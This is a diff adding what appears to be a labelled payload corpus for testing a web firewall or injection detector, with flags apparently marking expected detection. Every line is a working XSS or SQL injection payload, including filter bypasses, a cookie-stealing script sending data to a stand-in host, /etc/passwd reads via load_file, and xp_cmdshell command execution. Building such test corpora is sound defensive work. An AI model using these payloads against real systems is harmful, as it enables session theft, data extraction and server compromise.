@@ -1,0 +1,442 @@
+XSS - Basic ##<script>alert(1234)</script>##1
+XSS - Basic without alert##<script>prompt(1234)</script>##1
+XSS - Basic Obfuscation##<ScripT>alert(1234)</ScRipT>##1
+XSS - Basic on URL##/<script>alert(1234)</script>##0
+XSS - Basic ##<script>var m=<html><a href="//host">link</a>##1
+XSS - without script tag -1##<img+src="http://localhost">##1
+XSS - without script tag -2##<DIV+STYLE="background-image: url(javascript:alert(1))">##1
+XSS - without script tag -3##<IMG+DYNSRC="javascript:alert(1);">##1
+XSS - without script tag -4##<IMG+LOWSRC="javascript:alert(1);">##1
+XSS - without script tag -5##<isindex+type=image+src=1+onerror=alert(1)>##1
+XSS - without script tag -6##<meta style="xss:expression(open(alert(1)))" />##1
+XSS - without script tag -7##<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(1);\">##1
+XSS - without script tag -8##<!</textarea <body onload='alert(1)'>##1
+XSS - without script tag -9##<img+<iframe ="1" onerror="alert(1)">##1
+XSS - without script tag -10##<iframe src="http://localhost"></iframe>##1
+XSS - without script tag -11##<base+href="javascript:alert(1);//">##1
+XSS - without script tag -12##<bgsound+src="javascript:alert(1);">##1
+XSS - without script tag -13##<INPUT+TYPE="IMAGE"+SRC="javascript:alert(1);">##1
+XSS - without script tag -14##<object+data="javascript:alert(0)">##1
+XSS - without script tag -15##<STYLE>li+{list-style-image:url("javascript:alert(1)");}</STYLE><UL><LI>1##1
+XSS - without script tag -16##<Layer+src="http://localhost">##1
+XSS - without script tag -17##%3E%3Cbody%20onload=javascript:alert(1)%3E##1
+XSS - without script tag -18##'">><marquee><h1>1</h1></marquee>##1
+XSS - without script tag -19##</br style=a:expression(alert(1))>##1
+XSS - without script tag -20##<font style='color:expression(alert(1))'>##1
+XSS - without script tag -21##<embed src="data:image/svg+xml;>##1
+XSS - without script tag -22##<frameset><frame src="xss"></frameset>##1
+XSS - without script tag -23##<link href="http://host/xss.css">##1
+XSS - without script tag -24##="/>%3ciframe%20src%3djavascript%3aalert%283%29%3e##1
+XSS - without script tag -25##<object><param name="src" value="javascript:alert(0)"></param></object>##1
+XSS - without script tag -26##<isindex action=javascript:alert(1) type=image>##1
+XSS - without script tag -27##<b/alt="1"onmouseover=InputBox+1 language=vbs>test</b>##1
+XSS - without script tag -28##</a onmousemove="alert(1)">##1
+XSS - without script tag -29##'%26%26'javascript:alert%25281%2529//##1
+XSS - concatination##document.write("<scr"+"ipt language=javascript src=http://localhost/></scr"+"ipt>");##1
+XSS - developer blacklist##<scr<script>ipt>prompt(document.cookie)</scr</script>ipt>##1
+XSS - basic XSS as parameter name##12&<script>alert(123)</script>=123##1
+XSS - with eval##<img src=x:alert(alt) onerror=eval(src) alt=0>##1
+XSS - Jquery##<img src=/ onerror=alert(1)>##1
+XSS - with eval##a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);##1
+XSS - No white space for IE##<img/src="xss.png"alt="xss">##1
+XSS - Mocha##<IMG SRC="mocha:[code]">##1
+XSS - XHTML##<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1);</x:script>##1
+XSS - Remote style sheet##<STYLE>@import'http://host/css';</STYLE>##1
+XSS - Special XSS##<SCRIPT+a=">'>" SRC="http://localhost"></SCRIPT>##1
+XSS - Bypass for Custom Filters##<scr<script>ipt>alert('XSS')</scr</script>ipt>##1
+XSS - URL Encoded##%3Cscript%3Ealert(1)%3C/script%3E##1
+XSS - Null Byte Injected##foo%00<script>alert(document.cookie)</script>##1
+XSS - Developer filter bypass##"><<script>alert(document.cookie);//<</script>##1
+XSS - Concatination##><s"%2b"cript>alert(document.cookie)</s"%2B"cript>##1
+XSS - Extra URL Encoded##3Cscript%3Ealert(1)%3C%2Fscript%3E##1
+XSS - Double URL EncodedS##%253Cscript%253Ealert(1)%253C/script%253E##1
+XSS - Full URL Encoded##%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e##1
+XSS - Ascii Encoded##%BCscript%BEalert(%A21%A2)%BC/script%BE##1
+XSS - Overlong UTF##%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE##1
+XSS - Base64 Encoded##<object+data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>##1
+XSS - Base64 Encoded##<a HREF="data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==">ugh</a>##1
+XSS - Full Base64 Encoded##PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==##1
+XSS - HTML Encoded##<a+href="javas&#99;ript&#35;alert(1);">##1
+XSS - UTF-8 Encoded##<IMG+SRC=j&#X41vascript:alert(1)>##1
+XSS - UTF-8 Encoded##<IMG+SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#39;&#41;>##1
+XSS - Overlong UTF##%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE##1
+XSS - Long UTF-8 Encoded##<IMG+SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000039&#0000041>##1
+XSS - %U Encoded##%u0022%u003e%u003cscript%u003ealert%u0028%u0027Hello%u0027%u0029%u003c%u002fscript%u003e##1
+XSS - UTF-7 Encoded##+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-##1
+XSS - With uncommon event handler##<INPUT+TYPE="checkbox"+onDblClick=confirm(XSS)>##1
+XSS - With uncommon event handler##<APPLET+CODE=""+CODEBASE="http://url/xss">##1
+XSS - Without quotes##<SCRIPT>alert(String.fromCharCode(88))</SCRIPT>##1
+XSS - HTML Entity Encoding##&lt;script&gt;prompt(&apos;1&apos;)&lt;/script&gt;##1
+XSS - Hex Entity Encoding##&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;##1
+XSS - Decimal Entity Encoding##&#x60;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;&#x97;&#x108;&#x101;&#x114;&#x116;&#x40;&#x39;&#x120;&#x115;&#x115;&#x39;&#x41;&#x60;&#x47;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;##1
+XSS - Octal Entity Encoding##&#x74;&#x163;&#x143;&#x162;&#x151;&#x160;&#x164;&#x76;&#x141;&#x154;&#x145;&#x162;&#x164;&#x50;&#x47;&#x170;&#x163;&#x163;&#x47;&#x51;&#x74;&#x57;&#x163;&#x143;&#x162;&#x151;&#x160;&#x164;&#x76;##1
+XSS - Url Encoded HTML Entity##=<img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert%26%23x28;1%26%23x29;>##1
+XSS - With Expression for IE##"+style%3d"x%3aexpression(alert(1))+##1
+XSS - Escaping escapes##\";alert(1);//##1
+XSS - Eating Chars##<img src="x:%90" title="onerror=alert(1)//">##1
+XSS - Without Brackets -1##"+onmouseover="window.location='http://localhost'##1
+XSS - Without Brackets -2##"+onkeypress="prompt(23)"+##1
+XSS - Without Brackets -3##"+onfocus="prompt(1)"+##1
+XSS - Without Brackets -4##500);alert(1);//##1
+XSS - Without Brackets -5##alert(document['cookie'])##1
+XSS - Without Brackets -6##with(document)alert(cookie)##1
+XSS - Without Brackets -7##";location=location.hash)//#0={};alert(0)##1
+XSS - Without Brackets -8##//";alert(String.fromCharCode(88,83,83))##1
+XSS - Without Brackets -9##%F6%3Cimg+onmouseover=prompt(/test/)//%F6%3E##1
+XSS - Without Brackets -10##"+onDblClick=prompt(123)"+##1
+XSS - Without Brackets -11##"+onError=prompt(123)"+##1
+XSS - Without Brackets -12##"+onReset=prompt(123)"+##1
+XSS - With NewLine -1##%";eval(unescape(location))//#%0Aprompt(0)##1
+XSS - With NewLine -2##<SCRIPT>a=/XSS/%0Aalert(a.source)</SCRIPT>##1
+XSS - With NewLine -3##%'});%0aalert(1);%20//##1
+XSS - With NewLine and Comment##<script>//>%0Aalert(1);</script>##1
+XSS - With Encoded NewLine##<IMG+SRC="jav&#x0A;ascript:alert(1);">##1
+XSS - With Carriage Return##<IMG+SRC="jav%0dascript:alert(1);">##1
+XSS - With Encoded Carriage Return##<IMG+SRC="jav#x0D;ascript:alert(1);">##1
+XSS - With Tab##<IMG+SRC="jav%09ascript:alert(1);">##1
+XSS - with Encoded Tab##<IMG+SRC="jav&#x09;ascript:alert(1);">##1
+XSS - Null Byte in Script Tags##%3Cscript%3Ealert(1)%3C/script%00TESTTEST%3E##1
+XSS - Null Byte Injected -1##<script%00>alert(1)</script%00>##1
+XSS - Null Byte Injected -2##<scr%00ipt>prompt(1)</sc%00ript>##1
+XSS - Null Byte Injected -3##<scr\0ipt>prompt(1)</sc\0ript>##1
+XSS - Null Byte Injected -4##%00"><script>alert(1)</script>##1
+XSS - FormFeed Injected for IE##%3Cscript%0Caaaaa%3Ealert%28123%29%3C/script%0Caaaaa%3E##1
+XSS - FormFeed Injected for Firefox##<script%0Caaaaa>alert(123)</script>##1
+XSS - Vertical-tab Injected for IE##%3Cscript%0Baaa%3Ealert%281%29%3C/script%0Baaaa%3E##1
+XSS - Vertical-tab Injected for Firefox##%3Cscript%0Baaa%3Ealert%281%29%3C/script%3E##1
+XSS - With star##<*script>prompt(123)<*/script>##1
+XSS - Carriage Return Injected##<script%0Daaa>alert(1)</script%0Daaaa>##1
+XSS - Space Insertion##<script%20TEST>alert(1)</script%20TESTTEST>##1
+XSS - Non Alpha/Non Digit##<SCRIPT/XSSSRC="http://host"></SCRIPT>##1
+XSS - No Closing Script Tag##<SCRIPT+SRC=http://host/##1
+XSS - With Extra Brackets##<<SCRIPT>alert(1);//<</SCRIPT>##1
+XSS - Half-Width/Full-Width Characters##< s c r i p t > p r o m p t ( 1 ) < / s c r i p t >##1
+XSS - Half-Width/Full-Width Unicode -1##\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e\uff41\uff4c\uff45\uff52\uff54\uff08\uff07\uff58\uff53\uff53\uff07\uff09\uff1c\uff0f\uff53\uff43\uff52\uff49\uff50\uff54\uff1e##1
+XSS - Half-Width/Full-Width Unicode -2##%uff1c%uff53%uff43%uff52%uff49%uff50%uff54%uff1e%uff41%uff4c%uff45%uff52%uff54%uff08%uff07%uff58%uff53%uff53%uff07%uff09%uff1c%uff0f%uff53%uff43%uff52%uff49%uff50%uff54%uff1e##1
+XSS - Ful width %u encoding##%uff1cscript%uff1ealert(1234)%uff1c/script%uff1e##1
+XSS - In Javascript -1##javascript:propmpt(1)##1
+XSS - In Javascript -2##javascript:eval(unescape(location.href))##1
+XSS - In javascript -3##a="get";b="URL";c="javascript:";d="alert(1);";eval(a+b+c+d);##1
+XSS - In Javascript -4##location=location.hash.slice(1);##1
+XSS - In Javascript -5##";location=location.hash)//#0={};alert(0)##1
+XSS - In Javascript -6##location=location.hash##1
+XSS - In Javascript -7##""+{toString:alert}##1
+XSS - In Javascript -8##""+{valueOf:alert}##1
+XSS - In Javascript -9##";eval(unescape(location))//# %0Aalert(0)##1
+XSS - In Javascript -10##;location.href='http://site';//##1
+XSS - As a parametername##1&"><script>alert(1)</script>=1##1
+XSS - Custom Filter##</scr</script>ipt><ifr<iframeame/onload=prompt()>whs##1
+XSS - Realistic Exploit##%3E%3Cbody%20onload=javascript:alert(1)# var sc=escape(document.cookie);var d=escape(document.location);var mI=new Image();mI.src="http://host?a="+d+"&b="+ sc;##1
+SQL Injection - Basic with Select##x' AND 1=(SELECT COUNT(*) FROM tabname);--##1
+SQL Injection - Basic with Union##1+union+select+abc+from+abc##1
+SQL Injection - LoadFile##'union select 1,load_file(0x2f6574632f706173737764),3 from users--##1
+SQL Injection - ##0^(locate(0x61,(select id from users where num=1),1)=1)##1
+SQL Injection - Basic with insert##x';INSERT+INTO+aa('1')+values('1')--##1
+SQL Injection - Basic with update##x';UPDATE+aa+set+1='2'--##1
+SQL Injection - Basic Error Based##1+and+convert(int,@@servername)--##1
+SQL Injection - Command Execution##a';exec+master..xp_cmdshell+'ping'--##1
+SQL Injection - Command Execution##a';EXEC+master.dbo.xp_cmdshell+'ping'##1
+SQL Injection - Command Execution with HRF##';/*,1*/ EXEC /*,1*/ master..xp_cmdshell /*,1*/ "ping 127.0.0.1" /*,1*/--##1
+SQL Injection - Command Execution with HPP##';/*&iid=1*/ EXEC/*&iid=1*/ master..xp_cmdshell /*&iid=1*/ "ping 127.0.0.1" /*&iid=1*/--##1
+SQL Injection - Authentication Bypass -1##'1+or+1=1--##1
+SQL Injection - Authentication Bypass -2##'1+or+'ab'='ab1##1
+SQL Injection - Authentication Bypass -3##admin'--##1
+SQL Injection - Authentication Bypass -4##'--##1
+SQL Injection - Authentication Bypass -5##admin'/*##1
+SQL Injection - Authentication Bypass -6##admin'# ##1
+SQL Injection - Authentication Bypass -7##1'<99# ##1
+SQL Injection - Authentication Bypass -8##'=0=1# ##1
+SQL Injection - Authentication Bypass -9##'<=>0# ##1
+SQL Injection - Authentication Bypass -10##'!=2!=3!=4# ##1
+SQL Injection - Authentication Bypass -11##'|0# ##1
+SQL Injection - Authentication Bypass -12##'&0# ##1
+SQL Injection - Authentication Bypass -12##'^0# ##1
+SQL Injection - without union and select -1##1'+and+@@servername>1--##1
+SQL Injection - without union and select -2##1'+and+@@version>1--##1
+SQL Injection - without union and select -3##1'+HAVING 1=1--##1
+SQL Injection - without union and select -4##(coalesce(length(load_file(0x2F6574632F706173737764)),1))##1
+SQL Injection - without union and select -5##if(if((name)like(0x61646D696E),1,0),if(mid((password),1,1)like(0x61),id,0),0);%00##1
+SQL Injection - without union and select -5##(1)rlike(if(mid(@@version,1,1)like(5),0x28,1))##1
+SQL Injection - without union and select -6##1),(version(),1,1##1
+SQL Injection - without concat##1%20union%20/*!select*/%20/*!@@datadir*/##1
+SQL Injection - with comment##15+/*!union*/+/*!all*/+/*!select*/+1,2,3,4,5,6,7--##1
+SQL Injection - with comment##16+/*!UniOn*/+/*!AlL*/+/*!SeLecT*/+1,2,3,4,5,6,version()--##1
+SQL Injection - without union##1'+and+(select+pass+from+users+limit+1)='pass--##1
+SQL Injection - Basic Obfuscation##123+uniOn+SeLEcT+BaNneR+FroM+v$vERsIon+WhERe+ROwNUm=1##1
+SQL Injection - with Comments##union/*aaa*/select/*aaa*/1,2,3##1
+SQL Injection - without Quotes -1##if(substring(USER(),1,4)=0x726f6f74,SLEEP(5),1)##1
+SQL Injection - without Quotes -2##10+UNION+SELECT+LOAD_FILE(0x2f6574632f706173737764)##1
+SQL Injection - without and##1'&&1='1##1
+SQL Injection - without or##'='##1
+SQL Injection - without having##1'+and+(select+substr(group_concat(pass),1,1)+from+users)='a##1
+SQL Injection - URL Encoded##1%27%20union%20select%201,2,3--##1
+SQL Injection - Double URL Encoded##123%2527%2520select%2520convert(int,@@servername)--##1
+SQL Injection - Full URL Encoded##%53E%4c%45%43T%20%73%63h%65%6d%61%6ea%6de%20%46%52O%4d%20%70g%5f%74a%62%6ce%73##1
+SQL Injection - with double space##1++union++select++abc++from++abc##1
+SQL Injection - with URL Encoded double space##1%20%20union%20%20select%20%20abc%20%20from%20%20abc##1
+SQL Injection - with URL Encoded many space##1%20%20%20%20union%20%20%20%20select%20%20%20%20abc%20%20%20%20from%20%20%20%20abc##1
+SQL Injection - without space -1##1/*union*/union/*select*/select+1,2,3/*##1
+SQL Injection - without space -2##1%2520union%2520select%25201,2,3/*##1
+SQL Injection - without space -3##1%0Aunion%0Aselect%0A1,2,3/*##1
+SQL Injection - without space -4##1'OR'121'='121##1
+SQL Injection - without space -5##1'%0Cand%0C''='##1
+SQL Injection - without space -6##1'%0Cunion%0Cselect%0C1,2,3##1
+SQL Injection - without space -7##1'%0Band%0B''='##1
+SQL Injection - without space -8##1'%0Bunion%0Bselect%0B1,2,3##1
+SQL Injection - without space -9##1'%0Dand%0D''='##1
+SQL Injection - without space -10##1'%0Dunion%0Dselect%0D1,2,3##1
+SQL Injection - without space for MYSQL##union(select(version()))##1
+SQL Injection - with comments for MYSQL -1##123/*!or*/1=1;##1
+SQL Injection - with comments for MYSQL -2##1'union/*!select*/pass,load_file(0x11)from+users--##1
+SQL Injection - with comments for MYSQL -3##1 and 9=8 /*!uNiOn*/ aLl /*!sElect*/ 1,2,3--##1
+SQL Injection - without space mixed##1/**/union%a0select/**/1,pass,3`a`from`users`##1
+SQL Injection - comments (/*)##1+union+select+1,2,3/*##1
+SQL Injection - comments (--)##1+union+select+1,2,3--##1
+SQL Injection - comments (#)##1+union+select+1,2,3# ##1
+SQL Injection - comments (%00)##1+union+select+1,2,3;%00##1
+SQL Injection - comments without union (/*)##1+len(@@servername)>1/*##1
+SQL Injection - comments without union (--)##1+len(@@servername)>1--##1
+SQL Injection - comments without union (#)##1+len(@@servername)>1# ##1
+SQL Injection - comments without union (%00)##1+len(@@servername)>1;%00##1
+SQL Injection - string concatination for MSSQL##'); exec sp_executesql('W'+'ait'+'for'+' '+'de'+'lay'+' '+'00:00:40');--##1
+SQL Injection - string concatenation for MSSQL##'; EXEC ('SEL' + 'ECT US' + 'ER')##1
+SQL Injection - string concatenation for Oracle##'; EXECUTE IMMEDIATE  'SEL' || 'ECT US' || 'ER'##1
+SQL Injection - with variables##';declare @x varchar(80); set @x = 0x73656c65637420404076657273696f6e; EXEC (@x)##1
+SQL Injection - Encoded -1##';DECLARE+@S+NVARCHAR(200);SET+@S=CAST(0x73656c65637420404076657273696f6e+AS+NVARCHAR(200));EXEC(@S);##1
+SQL Injection - Encoded -2##1;declare+@myvar+nvarchar(80);set+@myvar=N'UNI'+N'ON%20SEL'+N'ECT%20U'+N'SER');EXEC(@myvar);##1
+SQL Injection - Obfuscated for MySQL-1##SET @c = CONCAT(b'01010011',b'01100101',b'01001100',b'01100101',b'01100011',b'01110100',' ',b'00110001');PREPARE s FROM @c;EXECUTE s;##1
+SQL Injection - Obfuscated for MySQL-2##SET @c = CONCAT(_latin1 b'01010011',_latin1 b'01100101',_latin1 b'01001100',_latin1 b'01100101',_latin1 b'01100011',_latin1 b'01110100',' ',_latin1 b'00110001');PREPARE s FROM @c;EXECUTE s;##1
+SQL Injection - Obfuscated for MySQL-3##SET @c = CONCAT(REPLACE(MAKE_SET(5,'SEL','xxxxx','ECT'), ',', ''),' 1');PREPARE s FROM @c;EXECUTE s;##1
+SQL Injection - Real World Example##123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6e75773a%2C%28CASE%20WHEN%20%286349=6349%2F%2A%2150521%20AND%206349=6350%2A%2F%29%20THEN%201%20ELSE%200%20END%29%2C0x3a6270793a%29%23##1
+SQL Injection - Current_user##123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6e75773a%2CIFNULL%28CAST%28CURRENT_USER%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a6270793a%29%23##1
+SQL Injection - apostrophemask ##123%EF%BC%87%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a757a793a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736a763a%29%23##1
+SQL Injection - null byte comment##123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a757a793a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736a763a%29%23%00##1
+SQL Injection - base64 encoded##MTIzJyBMSU1JVCAxLDEgVU5JT04gQUxMIFNFTEVDVCBDT05DQVQoMHgzYTc1N2E3OTNhLElGTlVMTChDQVNUKHZlcnNpb24oKSBBUyBDSEFSKSwweDIwKSwweDNhNzM2YTc2M2EpIw==##1
+SQL Injection - dash instead of space##%27--iXhuMCk%0ALIMIT--MogMpTZGYi%0A1%2C1--TPjIJcnXAuX%0AUNION--llDCqlfYffk%0AALL--AtQHoRbN%0ASELECT--aaoghwWht%0ACONCAT%280x3a7372773a%2CIFNULL%28CAST%28database%28%29--nXGeXoOEyHm%0AAS--tWKPbn%0ACHAR%29%2C0x20%29%2C0x3a6d79643a%29%23##1
+SQL Injection - full url encoded##%31%32%33%27%20%4C%49%4D%49%54%20%31%2C%31%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%43%4F%4E%43%41%54%28%30%78%33%61%37%33%37%32%37%37%33%61%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%64%61%74%61%62%61%73%65%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%33%61%36%64%37%39%36%34%33%61%29%23##1
+SQL Injection - hash instead of space##123%27%23DDvIMgC%0ALIMIT%23wyQDiZxbEfWH%0A1%2C1%23vJHSbhW%0AUNION%23WfNzMdJBEP%0AALL%23AgDqJl%0ASELECT%23xRYClbEPoiuX%0ACONCAT%280x3a7372773a%2CIFNULL%28CAST%28version%28%29%23BiJwsArZs%0AAS%23FgnwSFSQ%0ACHAR%29%2C0x20%29%2C0x3a6d79643a%29%23##1
+SQL Injection - like instead of equal-1##123%29%20AND%20%28SELECT%205524%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6864723a%2C%28SELECT%20%28CASE%20WHEN%20%285524%20LIKE%205524%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a7767793a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287619%20LIKE%207619##1
+SQL Injection - like instead of equal-2##123%29%20AND%202874%20LIKE%202341%20AND%20%288194%20LIKE%208194##1
+SQL Injection - isnull##123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6864723a%2CIF%28ISNULL%28CAST%28version%28%29%20AS%20CHAR%29%29%2C0x20%2CCAST%28version%28%29%20AS%20CHAR%29%29%2C0x3a7767793a%29%23##1
+SQL Injection - multiple space-1##123%29%20%20AND%20%20%20%208558=8593%20%20AND%20%20%20%20%285473=5473##1
+SQL Injection - multiple space-2##123%29%20%20%20%20AND%20%20%20%20%208558=8593%20%20AND%20%20%20%20%20%20%285473=5473##1
+SQL Injection - multiple space-3##123%27%20%20AND%20%20%20%28%20%20SELECT%20%20%20%202937%20%20%20FROM%28%20%20SELECT%20%20%20%20%20COUNT%28%2A%29%2C%20%20CONCAT%280x3a6d70663a%2C%28%20%20SELECT%20%20%20%20MID%28%28%20%20IFNULL%28%20CAST%28%20%20database%28%29%20%20%20AS%20%20%20%20%20%20%20CHAR%20%20%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a736e623a%2CFLOOR%28RAND%280%29%2A2%29%29x%20%20%20%20FROM%20%20%20%20INFORMATION_SCHEMA.CHARACTER_SETS%20%20%20%20GROUP%20%20%20%20%20BY%20%20%20%20x%29a%29%20%20AND%20%20%20%27rmHN%27=%27rmHN##1
+SQL Injection - multiple space-4##123%27%20%20%20%20LIMIT%20%20%201%2C1%20%20UNION%20%20%20%20%20ALL%20%20%20%20%20%20%20SELECT%20%20%20%20%20CONCAT%280x3a6d70663a%2C%20IFNULL%28%20CAST%28%20%20database%28%29%20%20%20AS%20%20%20%20%20CHAR%20%29%2C0x20%29%2C0x3a736e623a%29%23##1
+SQL Injection - tamper for % char-1##%1%2%3%%27%20%L%I%M%I%T%20%1%%2C%1%20%U%N%I%O%N%20%A%L%L%20%S%E%L%E%C%T%20%C%O%N%C%A%T%%28%0%x%3%a%6%d%7%0%6%6%3%a%%2C%I%F%N%U%L%L%%28%C%A%S%T%%28%d%a%t%a%b%a%s%e%%28%%29%20%A%S%20%C%H%A%R%%29%%2C%0%x%2%0%%29%%2C%0%x%3%a%7%3%6%e%6%2%3%a%%29%%23##1
+SQL Injection - tamper for % char-1##1%1%3%%27%+%A%N%D%+%1%=%1##1
+SQL Injection - magicquotes bypass##123%bf%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6d70663a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736e623a%29%23--%20##1
+SQL Injection - having-1##123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6d70663a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736e623a%29%23%20and%20%270having%27=%270having%27##1
+SQL Injection - having-2##123%29%20AND%201701=5451%20AND%20%283835=3835%20and%20%270having%27=%270having%27##1
+SQL Injection - multiple space, hash for space and having :)##123%27%23mPkKCjceC%0A%23pwsxOHFa%0ALIMIT%23GSTpANJXKGdC%0A%23uOaAVrPY%0A%23IufLHavTgnn%0A%23sRygbynG%0A1%2C1%23uRvizI%0A%23kNTIVAJnz%0AUNION%23IEVjNIbBGg%0A%23CrHaTy%0A%23PkPohIaUPUPP%0A%23ouAusiVKpxg%0A%23UTlHCuTls%0AALL%23ZdLRhsQPAkid%0A%23ObZxIruvjFbd%0A%23IxosRHsTC%0A%23lZlmVvV%0ASELECT%23FHaHzAMzvN%0A%23BWRjqHuR%0A%23BTtMGfzKairL%0A%23GvGSlRR%0A%23kbCsPv%0A%23kiirXiLzYG%0A%23RkKvrFrkKc%0ACONCAT%280x3a6267653a%2C%23TLxyzUYCN%0A%23iKDnXTOMyUX%0AIFNULL%28%23KLWKJH%0ACAST%28%23EVVXxVJ%0A%23ddeBcXdPJNK%0A%23JytbHTOvwXC%0Aversion%28%29%23OXQNXTG%0A%23JqAzVQn%0A%23uYcIYOA%0A%23xBATyw%0AAS%23SuQdAyf%0A%23hQHYtT%0A%23ReByaH%0A%23COkovdqzzcS%0A%23nJrotVbdX%0ACHAR%23NklnJgTSwC%0A%23StUlDCtwD%0A%23EHSUPhSgYLrO%0A%29%2C0x20%29%2C0x3a69626b3a%29%23%20and%20%270having%27=%270having%27##1
+SQL Injection - plus##123%27%2BLIMIT%2B1%2C1%2BUNION%2BALL%2BSELECT%2BCONCAT%280x3a6267653a%2CIFNULL%28CAST%28version%28%29%2BAS%2BCHAR%29%2C0x20%29%2C0x3a69626b3a%29%23##1
+SQL Injection - Mysql comment in sql-1##123%27%2F%2A%210LIMIT%201%2C1%2F%2A%210UNION%2F%2A%210ALL%2F%2A%210SELECT%2F%2A%210CONCAT%280x3a6267653a%2C%2F%2A%210IFNULL%28CAST%28%2F%2A%210version%28%29%2F%2A%210AS%2F%2A%210CHAR%29%2C0x20%29%2C0x3a69626b3a%29%23##1
+SQL Injection - Mysql comment in sql-2##123%27%20%2F%2A%2130631LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6267653a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a69626b3a%29%2A%2F%2##1
+SQL Injection - Mysql comment in sql-3##123%29%20%2F%2A%2100000AND%203244=4853%20AND%20%286013=6013%2A%2F##1
+SQL Injection - Mysql comment im sql-4##123%27%20%2F%2A%2100000LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6a7a713a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a79757a3a%29%2A%2F%23##1
+SQL Injection - Mysql comment im sql-5##123%27%2F%2A%21LIMIT%2A%2F1%2C1%2F%2A%21UNION%2A%2F%2F%2A%21ALL%2A%2F%2F%2A%21SELECT%2A%2F%2F%2A%21CONCAT%2A%2F%280x3a6a7a713a%2C%2F%2A%21IFNULL%2A%2F%28CAST%28%2F%2A%21database%2A%2F%28%29%2F%2A%21AS%2A%2F%2F%2A%21CHAR%2A%2F%29%2C0x20%29%2C0x3a79757a3a%29%23##1
+SQL Injection - MSSQL Tab-1##123%27%09LIMIT%0C1%2C1%0AUNION%04ALL%01SELECT%07CONCAT%280x3a6a7a713a%2CIFNULL%28CAST%28database%28%29%09AS%0BCHAR%29%2C0x20%29%2C0x3a79757a3a%29%23##1
+SQL Injection - MSSQL Tab-2##123%29%07AND%079869=8149%01AND%01%281045=1045##1
+Blind SQL Injection - Basic##1+and+1=1##1
+Blind SQL Injection - MySQL##1+and+100>(ASCII(Substring(user(),1,1)))##1
+Blind SQL Injection - MSSQL##1+and+100>(Select+top+1+ASCII(Substring(name,1,1))) from sysusers)--##1
+Blind SQL Injection - Oracle##1 and 100>(Select ASCII(Substr(username,1,1))) from all_users where rownum<=1)##1
+BLind SQL Injection - with substring##1 and substring(version(),1,1)=4##1
+Blind SQL Injection - with order by##1+order+by+19--##1
+Blind SQL Injection - with quotes##'1+and+'123'='123##1
+Blind SQL Injection - with functions##1'+or+@@servername=@@servername--##1
+Blind SQL Injection - with ASCII()##1+and+ascii('a')=97##1
+Blind SQL Injection - with HEX()##1+and+hex('a')=61##1
+Blind SQL Injection - with ORD()##1+and+ord('a') = 97##1
+Blind SQL Injection - with Hex value##1 and name=0x5265696E657273##1
+Blind SQL Injection - with builtin functions MSSQL##1+and+len(@@servername)>1--##1
+Blind SQL Injection - with builtin funcitons ORACLE##1+and+length(123)=3##1
+Blind SQL Injection - with MYSQL MD5()##123+AND+md5('a')!= md5('A')##1
+Blind SQL Injection - with subselect##and (select 1)=1##1
+Blind SQL Injection - without equal sign##123'+not+like+'1234##1
+Blind SQL Injection - without eqaul sign##'aaa'<>'bbb'##1
